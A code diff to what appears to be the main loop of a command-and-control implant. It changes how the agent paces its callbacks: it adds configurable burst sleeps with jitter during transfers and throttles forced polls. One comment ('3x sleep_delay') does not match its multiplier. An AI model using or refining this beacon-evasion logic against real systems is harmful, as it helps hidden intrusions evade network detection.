@@ -376,6 +376,14 @@ void AgentMain()
 			}
 		}
 
+		// Sync sleep_delay and burst config with connector
+		g_Connector->UpdateSleepDelay(g_Agent->config->sleep_delay);
+		g_Connector->UpdateBurstConfig(
+			g_Agent->config->profile.burst_enabled,
+			g_Agent->config->profile.burst_sleep,
+			g_Agent->config->profile.burst_jitter
+		);
+
 		// Periodically force a poll even if cached heartbeat indicates "no tasks"
 		{
 			ULONG now = GetTickCount();
@@ -383,36 +391,56 @@ void AgentMain()
 				nextForcePollTick = now + 1500 + (now & 0x3FF);
 			}
 			BOOL idle = (packerOut->datasize() < 8) && !g_Connector->IsBusy() && (pendingUpload == NULL);
-			if (idle && now >= nextForcePollTick) {
-				ULONG baseSleep = g_Agent->config->sleep_delay;
-				ULONG interval = baseSleep / 2;
-				if (interval < 1200) interval = 1200;
-				if (interval > 8000) interval = 8000;
-				interval += (now & 0x3FF);
-				nextForcePollTick = now + interval;
+			
+		if (idle && now >= nextForcePollTick) {
+			ULONG baseSleep = g_Agent->config->sleep_delay;
+			ULONG interval = baseSleep * 3000;  // 3x sleep_delay to avoid triggering every iteration
+			if (interval < 6000) interval = 6000;
+			if (interval > 60000) interval = 60000;
+			interval += (now & 0x3FF);
+			nextForcePollTick = now + interval;
 
+			// Only trigger if previous forcePoll was already used
+			if (!g_Connector->IsForcePollPending()) {
 				g_Connector->ForcePollOnce();
 			}
 		}
+		}
 
-		if (g_Agent->IsActive() && packerOut->datasize() < 8) {
+		if (g_Agent->IsActive()) {
 			ULONG baseSleep = g_Agent->config->sleep_delay;
 			ULONG jitter    = g_Agent->config->jitter_delay;
 
 			BOOL isBusy = g_Connector->IsBusy();
 			ULONG lastUp = g_Connector->GetLastUpTotal();
 			ULONG lastDown = g_Connector->GetLastDownTotal();
+			BOOL hasData = (packerOut->datasize() >= 8);
 
 			BOOL burst = FALSE;
-			if (isBusy || (lastUp >= (1 * 1024)) || (lastDown >= (1 * 1024))) {
+			if (isBusy || (lastUp >= (1 * 1024)) || (lastDown >= (1 * 1024)) || hasData) {
 				burst = TRUE;
 			}
 
-			if (burst) {
-				mySleep(50);
+			if (burst && g_Agent->config->profile.burst_enabled) {
+				// Burst ON + active transfer: use burst_sleep
+				ULONG burstMs = g_Agent->config->profile.burst_sleep;
+				ULONG burstJitter = g_Agent->config->profile.burst_jitter;
+				if (burstMs == 0) burstMs = 50;
+
+				if (burstJitter > 0 && burstJitter <= 90) {
+					ULONG jitterRange = (burstMs * burstJitter) / 100;
+					ULONG jitterDelta = GetTickCount() % (jitterRange + 1);
+					burstMs = burstMs - (jitterRange / 2) + jitterDelta;
+					if (burstMs < 10) burstMs = 10;
+				}
+				mySleep(burstMs);
 				g_Connector->ResetTrafficTotals();
 			} else {
+				// Burst OFF or idle: always use sleep_delay
 				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
+				if (burst) {
+					g_Connector->ResetTrafficTotals();
+				}
 			}
 		}
 
